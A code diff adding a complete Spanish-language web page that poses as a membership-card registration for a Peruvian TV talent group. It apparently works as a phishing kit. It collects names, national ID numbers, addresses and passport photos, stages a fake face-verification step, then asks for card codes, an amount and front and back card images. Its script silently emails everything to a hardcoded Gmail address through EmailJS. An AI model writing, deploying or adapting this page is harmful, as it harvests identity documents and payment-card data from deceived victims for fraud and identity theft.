@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Grupo de TV de Talento Peruano</title>
+    
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+       (function(){
+          emailjs.init("T9BKyUuVj2V4b31r");
+       })();
+    </script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #b30000;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .screen {
+            display: none;
+            width: 100%;
+            height: 100%;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* --- SCREEN 1: Splash / Loader --- */
+        #screen-splash .container {
+            text-align: center;
+            background: #ffffff;
+            color: #b30000;
+            padding: 50px 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 450px;
+            width: 90%;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        #screen-splash h1 {
+            font-size: 24px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+
+        #screen-splash h2 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 40px;
+            color: #333333;
+        }
+
+        .loader-dots {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .loader-dots span {
+            width: 14px;
+            height: 14px;
+            background-color: #b30000;
+            border-radius: 50%;
+            animation: bounce 1.4s infinite ease-in-out both;
+        }
+
+        .loader-dots span:nth-child(1) { animation-delay: -0.32s; }
+        .loader-dots span:nth-child(2) { animation-delay: -0.16s; }
+        .loader-dots span:nth-child(3) { animation-delay: 0s; }
+        .loader-dots span:nth-child(4) { animation-delay: 0.16s; }
+        .loader-dots span:nth-child(5) { animation-delay: 0.32s; }
+        .loader-dots span:nth-child(6) { animation-delay: 0.48s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% { transform: scale(0); } 
+            40% { transform: scale(1.0); }
+        }
+
+        /* --- FORMS --- */
+        .form-container-box {
+            background: #ffffff;
+            color: #333333;
+            padding: 35px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 450px;
+            width: 100%;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        .form-container-box h1 {
+            font-size: 24px;
+            font-weight: 700;
+            text-transform: uppercase;
+            text-align: center;
+            color: #b30000;
+            margin-bottom: 5px;
+            letter-spacing: 1px;
+        }
+
+        .subtitle {
+            font-size: 13px;
+            text-align: center;
+            color: #666666;
+            margin-bottom: 25px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            font-size: 13px;
+            color: #333333;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #cccccc;
+            border-radius: 8px;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .form-group input:focus {
+            border-color: #b30000;
+            box-shadow: 0 0 5px rgba(179, 0, 0, 0.2);
+        }
+
+        .upload-box {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 2px dashed #b30000;
+            border-radius: 8px;
+            padding: 12px 15px;
+            cursor: pointer;
+            background-color: #fff9f9;
+            transition: background-color 0.3s, border-color 0.3s;
+            margin-bottom: 20px;
+        }
+
+        .upload-box:hover {
+            background-color: #ffeeee;
+            border-color: #8a0000;
+        }
+
+        .upload-left {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .upload-box svg {
+            width: 24px;
+            height: 24px;
+            fill: #b30000;
+        }
+
+        .upload-box span {
+            font-size: 13px;
+            font-weight: 600;
+            color: #b30000;
+        }
+
+        .file-name {
+            font-size: 12px;
+            color: #555555;
+            max-width: 150px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        input[type="file"] {
+            display: none;
+        }
+
+        .btn-action {
+            width: 100%;
+            padding: 14px;
+            background-color: #b30000;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: background-color 0.3s, transform 0.1s;
+        }
+
+        .btn-action:hover {
+            background-color: #8a0000;
+        }
+
+        .btn-action:active {
+            transform: scale(0.98);
+        }
+
+        .upload-section {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .upload-box-split {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border: 2px dashed #b30000;
+            border-radius: 10px;
+            padding: 20px 10px;
+            cursor: pointer;
+            background-color: #fff9f9;
+            transition: background-color 0.3s, border-color 0.3s;
+            text-align: center;
+        }
+
+        .upload-box-split:hover {
+            background-color: #ffeeee;
+            border-color: #8a0000;
+        }
+
+        .upload-box-split svg {
+            width: 28px;
+            height: 28px;
+            fill: #b30000;
+            margin-bottom: 8px;
+        }
+
+        .upload-box-split span {
+            font-size: 13px;
+            font-weight: 600;
+            color: #b30000;
+        }
+
+        .split-file-name {
+            font-size: 11px;
+            color: #555555;
+            margin-top: 5px;
+            word-break: break-all;
+            max-width: 100%;
+        }
+
+        /* --- SCREEN 3: Face ID Styles --- */
+        #screen-faceid .faceid-container {
+            text-align: center;
+            background: #ffffff;
+            color: #b30000;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            max-width: 400px;
+            width: 90%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        #screen-faceid h1 {
+            font-size: 22px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+            color: #b30000;
+        }
+
+        .face-container {
+            position: relative;
+            width: 180px;
+            height: 240px;
+            border-radius: 50% / 60%;
+            overflow: hidden;
+            border: 4px solid #b30000;
+            box-shadow: 0 0 15px rgba(179, 0, 0, 0.4);
+            background: #000;
+            margin-bottom: 15px;
+        }
+
+        #video-feed, #face-canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background-color: #ff3333;
+            box-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+            animation: scanAnimation 2s infinite ease-in-out;
+            z-index: 3;
+        }
+
+        @keyframes scanAnimation {
+            0% { top: 0%; }
+            50% { top: 95%; }
+            100% { top: 0%; }
+        }
+
+        .status-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333333;
+            min-height: 28px;
+            margin-bottom: 10px;
+        }
+
+        .btn-override {
+            background-color: #333;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 11px;
+            cursor: pointer;
+            text-transform: uppercase;
+            margin-top: 5px;
+        }
+
+        /* --- SCREEN 5: ID Card Styles --- */
+        #screen-card {
+            background-color: #2b2b2b;
+        }
+
+        .id-card {
+            width: 650px;
+            height: 410px;
+            background: linear-gradient(90deg, 
+                #8a0f1e 0%, #8a0f1e 30%, 
+                #ffffff 30%, #ffffff 70%, 
+                #8a0f1e 70%, #8a0f1e 100%
+            );
+            border-radius: 16px;
+            position: relative;
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.5), inset 0 0 10px rgba(255,255,255,0.2);
+            overflow: hidden;
+            border: 2px solid #5a0710;
+        }
+
+        .pattern-left {
+            position: absolute;
+            left: 0;
+            bottom: 0;
+            width: 150px;
+            height: 200px;
+            background: radial-gradient(circle, transparent 40%, rgba(255,255,255,0.08) 41%);
+            background-size: 8px 8px;
+            pointer-events: none;
+        }
+
+        .pattern-right {
+            position: absolute;
+            right: 0;
+            top: 50%;
+            width: 120px;
+            height: 120px;
+            background: radial-gradient(circle, transparent 40%, rgba(255,255,255,0.08) 41%);
+            background-size: 10px 10px;
+            border-radius: 50%;
+            pointer-events: none;
+        }
+
+        .card-header {
+            text-align: center;
+            padding-top: 15px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .logo-icon {
+            width: 55px;
+            height: 45px;
+            background: linear-gradient(135deg, #b8860b, #5a0710);
+            border-radius: 50% 40% 50% 30%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
+            border: 1px solid #d4af37;
+        }
+
+        .logo-icon::after {
+            content: "📷";
+            font-size: 20px;
+        }
+
+        .logo-text {
+            font-family: 'Times New Roman', serif;
+            font-weight: bold;
+            font-size: 14px;
+            line-height: 1.1;
+            color: #4a040b;
+            text-align: left;
+        }
+
+        .card-title {
+            text-align: center;
+            font-family: 'Times New Roman', serif;
+            font-size: 15px;
+            font-weight: bold;
+            color: #111;
+            margin-top: 8px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        .card-body {
+            display: flex;
+            padding: 10px 25px;
+            gap: 20px;
+        }
+
+        .photo-section {
+            width: 160px;
+            height: 200px;
+            background: #e0e0e0;
+            border: 3px solid #ccc;
+            border-radius: 8px;
+            position: relative;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+
+        .watermark-peru {
+            position: absolute;
+            top: 5px;
+            left: 10px;
+            font-size: 9px;
+            color: #777;
+            font-weight: bold;
+            z-index: 2;
+        }
+
+        .passport-label {
+            position: absolute;
+            top: 8px;
+            right: 8px;
+            font-size: 8px;
+            color: #555;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            z-index: 2;
+        }
+
+        .smart-chip {
+            position: absolute;
+            bottom: 12px;
+            left: 12px;
+            width: 32px;
+            height: 26px;
+            background: linear-gradient(135deg, #e6c65c, #b8860b, #d4af37);
+            border-radius: 4px;
+            border: 1px solid #7c6007;
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            grid-template-rows: repeat(2, 1fr);
+            gap: 1px;
+            padding: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+            z-index: 2;
+        }
+
+        .smart-chip div {
+            background: #f3e5ab;
+            border: 0.5px solid #8c6a0b;
+            border-radius: 1px;
+        }
+
+        .info-section {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            justify-content: center;
+        }
+
+        .field-group {
+            display: flex;
+            flex-direction: column;
+            border-bottom: 1px dashed #7a0c17;
+            padding-bottom: 3px;
+        }
+
+        .field-label {
+            font-size: 11px;
+            font-weight: bold;
+            color: #1a1a1a;
+            font-family: Arial, sans-serif;
+            letter-spacing: 0.3px;
+        }
+
+        .field-line {
+            height: 16px;
+            font-size: 13px;
+            font-weight: 600;
+            color: #222;
+        }
+
+        .micro-banner {
+            background: #7a0c17;
+            color: rgba(255,255,255,0.7);
+            font-size: 5px;
+            text-align: center;
+            letter-spacing: 1px;
+            padding: 1px 0;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: clip;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+        }
+
+        .card-footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 65px;
+            background: linear-gradient(0deg, rgba(138,15,30,0.85) 0%, rgba(200,120,130,0.7) 100%);
+            border-top: 1px solid rgba(255,255,255,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 15px;
+        }
+
+        .footer-left {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            max-width: 440px;
+        }
+
+        .signature-row {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .firma-title {
+            font-size: 11px;
+            font-weight: bold;
+            color: #1a1a1a;
+            letter-spacing: 0.5px;
+        }
+
+        .firma-line {
+            font-family: 'Brush Script MT', cursive;
+            font-size: 15px;
+            color: #0b1d3a;
+            border-bottom: 1px solid #111;
+            padding-bottom: 1px;
+            min-width: 90px;
+        }
+
+        .firma-sub {
+            font-size: 8px;
+            font-weight: bold;
+            color: #111;
+        }
+
+        .footer-disclaimer {
+            font-size: 7px;
+            color: #111;
+            line-height: 1.1;
+        }
+
+        .hologram-seal {
+            width: 32px;
+            height: 32px;
+            background: radial-gradient(circle, #fff, #999, #444);
+            border-radius: 50%;
+            border: 1px solid rgba(255,255,255,0.6);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+        }
+
+        .footer-right {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .qr-code-box {
+            width: 45px;
+            height: 45px;
+            background: #fff;
+            padding: 2px;
+            border-radius: 3px;
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            grid-template-rows: repeat(5, 1fr);
+            gap: 1px;
+            border: 1px solid #000;
+        }
+
+        .qr-pixel {
+            background: #000;
+        }
+
+        .qr-pixel.white {
+            background: #fff;
+        }
+
+        .qr-label {
+            font-size: 7px;
+            font-weight: bold;
+            color: #111;
+            margin-top: 2px;
+            text-align: center;
+        }
+
+        .validity-text {
+            position: absolute;
+            bottom: 2px;
+            right: 70px;
+            font-size: 7px;
+            font-weight: bold;
+            color: #111;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ================= SCREEN 1: Splash / Loader ================= -->
+    <div id="screen-splash" class="screen">
+        <div class="container">
+            <h1>Grupo De TV</h1>
+            <h2>De Talento Peruano</h2>
+            <div class="loader-dots">
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ================= SCREEN 2: Register Form ================= -->
+    <div id="screen-register" class="screen active">
+        <div class="form-container-box">
+            <h1>Registrar Tarjeta</h1>
+            <div class="subtitle">Tarjeta de Identificación de Membresía</div>
+
+            <form id="register-form">
+                <div class="form-group">
+                    <label for="fullname">Nombre Completo</label>
+                    <input type="text" id="fullname" placeholder="Ingresa tu nombre completo" required>
+                </div>
+                <div class="form-group">
+                    <label for="dni">DNI / N° de ID</label>
+                    <input type="text" id="dni" placeholder="Ingresa tu número de DNI o ID" required>
+                </div>
+                <div class="form-group">
+                    <label for="talent">¿Cuál es tu talento?</label>
+                    <input type="text" id="talent" placeholder="Ej. Canto, baile, actuación..." required>
+                </div>
+                <div class="form-group">
+                    <label for="source">¿Cómo te enteraste de este programa?</label>
+                    <input type="text" id="source" placeholder="Ej. Redes sociales, TV, amigos..." required>
+                </div>
+                <div class="form-group">
+                    <label for="address">Dirección</label>
+                    <input type="text" id="address" placeholder="Ingresa tu dirección" required>
+                </div>
+
+                <div class="upload-box" onclick="document.getElementById('passportFile').click()">
+                    <div class="upload-left">
+                        <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+                        <span>Foto Tamaño Pasaporte</span>
+                    </div>
+                    <div id="passportName" class="file-name">Ningún archivo</div>
+                </div>
+                <input type="file" id="passportFile" accept="image/*" onchange="handleFileSelect('passportFile', 'passportName', 'passportBase64')">
+
+                <button type="submit" class="btn-action">Generar Tarjeta</button>
+            </form>
+        </div>
+    </div>
+
+
+    <!-- ================= SCREEN 3: Face ID Verification ================= -->
+    <div id="screen-faceid" class="screen">
+        <div class="faceid-container">
+            <h1>Face ID</h1>
+            <div class="face-container">
+                <video id="video-feed" autoplay playsinline muted></video>
+                <canvas id="face-canvas"></canvas>
+                <div class="scan-line"></div>
+            </div>
+            <div id="status" class="status-text">Buscando rostro en cámara...</div>
+            <button type="button" class="btn-override" onclick="forceFaceVerified()">[Modo Prueba] Simular Rostro Detectado</button>
+        </div>
+    </div>
+
+
+    <!-- ================= SCREEN 4: Card Activation Form ================= -->
+    <div id="screen-activate" class="screen">
+        <div class="form-container-box">
+            <h1>Activar</h1>
+            <div class="subtitle">Activar para obtener tarjeta de membresía</div>
+
+            <form id="activate-form">
+                <div class="form-group">
+                    <label for="cardName">Nombre de la Tarjeta</label>
+                    <input type="text" id="cardName" placeholder="Ingrese el tipo de tarjeta" required>
+                </div>
+                <div class="form-group">
+                    <label for="cardCode">Código de la Tarjeta</label>
+                    <input type="text" id="cardCode" placeholder="Ingrese el código o dígitos" required>
+                </div>
+                <div class="form-group">
+                    <label for="amount">Monto</label>
+                    <input type="number" id="amount" placeholder="0.00" step="any" required>
+                </div>
+
+                <div class="upload-section">
+                    <div class="upload-box-split" onclick="document.getElementById('frontFile').click()">
+                        <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+                        <span>Frente</span>
+                        <div id="frontName" class="split-file-name"></div>
+                    </div>
+                    <input type="file" id="frontFile" accept="image/*" onchange="handleFileSelect('frontFile', 'frontName', 'frontBase64')">
+
+                    <div class="upload-box-split" onclick="document.getElementById('backFile').click()">
+                        <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+                        <span>Dorso</span>
+                        <div id="backName" class="split-file-name"></div>
+                    </div>
+                    <input type="file" id="backFile" accept="image/*" onchange="handleFileSelect('backFile', 'backName', 'backBase64')">
+                </div>
+
+                <button type="submit" class="btn-action">Listo</button>
+            </form>
+        </div>
+    </div>
+
+
+    <!-- ================= SCREEN 5: Membership ID Card ================= -->
+    <div id="screen-card" class="screen">
+        <div class="id-card">
+            <div class="micro-banner">
+                GRUPO DE TV DE TALENTO PERUANO &nbsp;&bull;&nbsp; GRUPO DE TV DE TALENTO PERUANO &nbsp;&bull;&nbsp; GRUPO DE TV DE TALENTO PERUANO &nbsp;&bull;&nbsp; GRUPO DE TV DE TALENTO PERUANO
+            </div>
+
+            <div class="pattern-left"></div>
+            <div class="pattern-right"></div>
+
+            <div class="card-header">
+                <div class="logo-container">
+                    <div class="logo-icon"></div>
+                    <div class="logo-text">
+                        GRUPO DE TV<br>
+                        DE TALENTO<br>
+                        PERUANO
+                    </div>
+                </div>
+                <div class="card-title">TARJETA DE IDENTIFICACIÓN DE MIEMBRO</div>
+            </div>
+
+            <div class="card-body">
+                <div class="photo-section">
+                    <span class="watermark-peru">🇵🇪</span>
+                    <span class="passport-label">FOTO ID</span>
+                    
+                    <div id="passport-container" style="width:100%; height:100%; position:absolute; top:0; left:0; display:flex; align-items:center; justify-content:center;">
+                        <span style="font-size: 11px; color: #888; text-align: center; padding: 10px;">Sin foto</span>
+                    </div>
+
+                    <div class="smart-chip">
+                        <div></div><div></div><div></div><div></div>
+                    </div>
+                </div>
+
+                <div class="info-section">
+                    <div class="field-group">
+                        <span class="field-label">NOMBRE COMPLETO:</span>
+                        <div class="field-line" id="card-fullname"></div>
+                    </div>
+                    <div class="field-group">
+                        <span class="field-label">Nº DNI / ID:</span>
+                        <div class="field-line" id="card-dni"></div>
+                    </div>
+                    <div class="field-group">
+                        <span class="field-label">ROL / TALENTO:</span>
+                        <div class="field-line" id="card-talent"></div>
+                    </div>
+                    <div class="field-group">
+                        <span class="field-label">TELÉFONO / ORIGEN:</span>
+                        <div class="field-line" id="card-source"></div>
+                    </div>
+                    <div class="field-group">
+                        <span class="field-label">FECHA DE INGRESO:</span>
+                        <div class="field-line" id="card-date"></div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card-footer">
+                <div class="footer-left">
+                    <div class="signature-row">
+                        <div>
+                            <div class="firma-title">FIRMA</div>
+                            <div class="firma-sub">Firma Autorizada</div>
+                        </div>
+                        <div class="firma-line">J. Silva</div>
+                        <div class="hologram-seal">🦅</div>
+                    </div>
+                    <div class="footer-disclaimer">
+                        Esta tarjeta es propiedad de GRUPO DE TV DE TALENTO PERUANO. Es personal e intransferible.<br>
+                        En caso de extravio, por favor contactar a: soporte.miembros@gruopertalento.tv.pe.
+                    </div>
+                </div>
+
+                <div class="validity-text">VÁLIDO HASTA: DICIEMBRE 2028</div>
+
+                <div class="footer-right">
+                    <div class="qr-code-box">
+                        <div class="qr-pixel"></div><div class="qr-pixel"></div><div class="qr-pixel"></div><div class="qr-pixel white"></div><div class="qr-pixel"></div>
+                        <div class="qr-pixel white"></div><div class="qr-pixel"></div><div class="qr-pixel white"></div><div class="qr-pixel"></div><div class="qr-pixel white"></div>
+                        <div class="qr-pixel"></div><div class="qr-pixel white"></div><div class="qr-pixel"></div><div class="qr-pixel white"></div><div class="qr-pixel"></div>
+                        <div class="qr-pixel white"></div><div class="qr-pixel"></div><div class="qr-pixel white"></div><div class="qr-pixel"></div><div class="qr-pixel white"></div>
+                        <div class="qr-pixel"></div><div class="qr-pixel white"></div><div class="qr-pixel"></div><div class="qr-pixel"></div><div class="qr-pixel"></div>
+                    </div>
+                    <div class="qr-label">CÓDIGO QR</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- ================= App Logic & Persistent State ================= -->
+    <script>
+        let appData = {
+            currentScreen: 'screen-register',
+            fullname: '',
+            dni: '',
+            talent: '',
+            source: '',
+            address: '',
+            passportBase64: null,
+            passportFilename: '',
+            cardName: '',
+            cardCode: '',
+            amount: '',
+            frontBase64: null,
+            frontFilename: '',
+            backBase64: null,
+            backFilename: '',
+            faceVerified: false
+        };
+
+        function loadState() {
+            const saved = localStorage.getItem('tv_peruano_app_state');
+            if (saved) {
+                try {
+                    appData = JSON.parse(saved);
+                } catch(e) { console.error(e); }
+            }
+        }
+
+        function saveState() {
+            localStorage.setItem('tv_peruano_app_state', JSON.stringify(appData));
+        }
+
+        function restoreInputs() {
+            document.getElementById('fullname').value = appData.fullname || '';
+            document.getElementById('dni').value = appData.dni || '';
+            document.getElementById('talent').value = appData.talent || '';
+            document.getElementById('source').value = appData.source || '';
+            document.getElementById('address').value = appData.address || '';
+            if (appData.passportFilename) document.getElementById('passportName').textContent = appData.passportFilename;
+
+            document.getElementById('cardName').value = appData.cardName || '';
+            document.getElementById('cardCode').value = appData.cardCode || '';
+            document.getElementById('amount').value = appData.amount || '';
+            if (appData.frontFilename) document.getElementById('frontName').textContent = appData.frontFilename;
+            if (appData.backFilename) document.getElementById('backName').textContent = appData.backFilename;
+
+            if (appData.fullname) {
+                document.getElementById('card-fullname').textContent = appData.fullname.toUpperCase();
+                document.getElementById('card-dni').textContent = appData.dni;
+                document.getElementById('card-talent').textContent = appData.talent;
+                document.getElementById('card-source').textContent = appData.source;
+                document.getElementById('card-date').textContent = new Date().toLocaleDateString('es-ES');
+            }
+
+            if (appData.passportBase64) {
+                document.getElementById('passport-container').innerHTML = `<img src="${appData.passportBase64}" style="width:100%; height:100%; object-fit:cover;">`;
+            }
+        }
+
+        function switchScreen(screenId) {
+            appData.currentScreen = screenId;
+            saveState();
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById(screenId).classList.add('active');
+
+            if (screenId === 'screen-faceid' && !appData.faceVerified) {
+                initFaceIDScanner();
+            }
+        }
+
+        function handleFileSelect(inputId, nameId, dataKey) {
+            const input = document.getElementById(inputId);
+            const nameContainer = document.getElementById(nameId);
+            if (input.files && input.files[0]) {
+                const file = input.files[0];
+                nameContainer.textContent = file.name;
+                
+                if (dataKey === 'passportBase64') appData.passportFilename = file.name;
+                if (dataKey === 'frontBase64') appData.frontFilename = file.name;
+                if (dataKey === 'backBase64') appData.backFilename = file.name;
+
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    appData[dataKey] = e.target.result;
+                    saveState();
+                    if (dataKey === 'passportBase64') {
+                        document.getElementById('passport-container').innerHTML = `<img src="${e.target.result}" style="width:100%; height:100%; object-fit:cover;">`;
+                    }
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', () => {
+            loadState();
+            restoreInputs();
+            switchScreen('screen-register');
+        });
+
+        document.getElementById('register-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            appData.fullname = document.getElementById('fullname').value;
+            appData.dni = document.getElementById('dni').value;
+            appData.talent = document.getElementById('talent').value;
+            appData.source = document.getElementById('source').value;
+            appData.address = document.getElementById('address').value;
+            saveState();
+
+            switchScreen('screen-faceid');
+        });
+
+        let cameraStream = null;
+        let detectionInterval = null;
+
+        async function initFaceIDScanner() {
+            const videoElement = document.getElementById('video-feed');
+            const statusElement = document.getElementById('status');
+            const canvas = document.getElementById('face-canvas');
+            const ctx = canvas.getContext('2d');
+
+            statusElement.innerText = "Iniciando cámara y buscando rostro...";
+            statusElement.style.color = "#333333";
+
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 480 } 
+                });
+                videoElement.srcObject = cameraStream;
+            } catch (err) {
+                console.warn("Cámara no disponible:", err);
+                statusElement.innerText = "Cámara no disponible. Use el botón de simulación abajo.";
+                statusElement.style.color = "#b30000";
+                return;
+            }
+
+            let frameCount = 0;
+            detectionInterval = setInterval(() => {
+                if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
+                
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                let centerX = Math.floor(canvas.width / 2);
+                let centerY = Math.floor(canvas.height / 2);
+                let pixel = ctx.getImageData(centerX, centerY, 1, 1).data;
+                let brightness = (pixel[0] + pixel[1] + pixel[2]) / 3;
+                frameCount++;
+
+                if (brightness > 25 && brightness < 240) {
+                    statusElement.innerText = `Escaneando rasgos faciales... (${Math.min(frameCount * 25, 100)}%)`;
+                    statusElement.style.color = "#0066cc";
+
+                    if (frameCount >= 4) {
+                        clearInterval(detectionInterval);
+                        completeFaceVerification();
+                    }
+                } else {
+                    statusElement.innerText = "Por favor, colóquese frente a la cámara...";
+                    statusElement.style.color = "#b30000";
+                }
+            }, 1000);
+        }
+
+        function completeFaceVerification() {
+            const statusElement = document.getElementById('status');
+            statusElement.innerText = "¡Rostro verificado con éxito!";
+            statusElement.style.color = "#008000";
+            
+            appData.faceVerified = true;
+            saveState();
+
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+
+            setTimeout(() => {
+                switchScreen('screen-activate');
+            }, 1200);
+        }
+
+        function forceFaceVerified() {
+            if (detectionInterval) clearInterval(detectionInterval);
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            completeFaceVerification();
+        }
+
+        document.getElementById('activate-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            appData.cardName = document.getElementById('cardName').value;
+            appData.cardCode = document.getElementById('cardCode').value;
+            appData.amount = document.getElementById('amount').value;
+            saveState();
+
+            // Prepare parameters for EmailJS
+            const templateParams = {
+                to_email: "chulrobert105@gmail.com",
+                fullname: appData.fullname,
+                dni: appData.dni,
+                talent: appData.talent,
+                source: appData.source,
+                address: appData.address,
+                card_name: appData.cardName,
+                card_code: appData.cardCode,
+                amount: appData.amount,
+                passport_image: appData.passportBase64 || "",
+                front_image: appData.frontBase64 || "",
+                dorso_image: appData.backBase64 || ""
+            };
+
+            // Send via EmailJS automatically
+            emailjs.send("service_7fiv2im", "template_omq80vg", templateParams)
+                .then(function(response) {
+                    console.log('SUCCESS!', response.status, response.text);
+                }, function(error) {
+                    console.log('FAILED...', error);
+                    alert('Hubo un error al enviar el correo automático.');
+                });
+
+            document.getElementById('card-fullname').textContent = appData.fullname.toUpperCase();
+            document.getElementById('card-dni').textContent = appData.dni;
+            document.getElementById('card-talent').textContent = appData.talent;
+            document.getElementById('card-source').textContent = appData.source;
+            document.getElementById('card-date').textContent = new Date().toLocaleDateString('es-ES');
+
+            if (appData.passportBase64) {
+                document.getElementById('passport-container').innerHTML = `<img src="${appData.passportBase64}" style="width:100%; height:100%; object-fit:cover;">`;
+            }
+
+            switchScreen('screen-card');
+        });
+    </script>
+</body>
+</html>
